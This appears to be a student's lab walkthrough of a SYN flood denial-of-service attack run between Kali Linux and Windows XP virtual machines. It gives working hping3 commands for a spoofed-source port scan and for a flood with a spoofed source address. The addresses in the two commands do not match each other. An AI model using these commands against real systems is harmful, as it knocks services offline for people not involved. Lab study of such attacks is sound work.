By OUKACI SARA M1 SSI
# ddos_attack_SYN_Flood_Attack_with_hping3

#### Step 1: Set Up Virtual Machines
1. **Open Oracle VM VirtualBox**.
2. **Create and configure two virtual machines**:
   - Kali Linux
   - Windows XP
3. **Ensure both virtual machines are connected to the same network**:
   which I use NAT Network Adapter in VirtualBox settings to can do this

#### Step 2: Install `hping3` on Kali Linux
1. **Open a terminal** in Kali Linux.
2. **Install `hping3`**  using :

   sudo apt-get update
   sudo apt-get install hping3
 

#### Step 3: Perform a Port Scan on the Target Machine
1. **Determine the IP address** of the Windows XP machine.
2. **Run the port scan** from the Kali Linux terminal:
  
   hping3 --scan 1-65535 192.168.56.103 -S --rand-source
  
   - This scans all ports (1-65535) on the target IP address using TCP SYN packets with random source IP addresses.
3. **Note the open ports** from the scan results.

#### Step 4: Perform a SYN Flood Attack
1. **Choose an open port** to target from the previous scan.
2. **Run the SYN flood attack** from the Kali Linux terminal:
  
   hping3 -S 192.168.56.102 -a 192.168.56.103 -p 135 --flood

3. **Monitor the attack output** in the terminal.

#### Step 5: Monitor Network Performance on the Target Machine
1. **Open CPU window** on the Windows XP machine:
2. **Set up a network monitoring graph**:
   - In the Performance window, right-click on the graph area and choose **Add Counters**.
   - Select **Network Interface** from the list of counters and choose the appropriate network adapter.
   - Click **Add** and then **OK** to start monitoring network performance.
3. **Observe the network utilization graph** for any spikes or unusual activity.

#### Step 6: Analyze Results and Conclude
1. **Review the network performance data** on the Windows XP machine to determine the impact of the SYN flood attack.






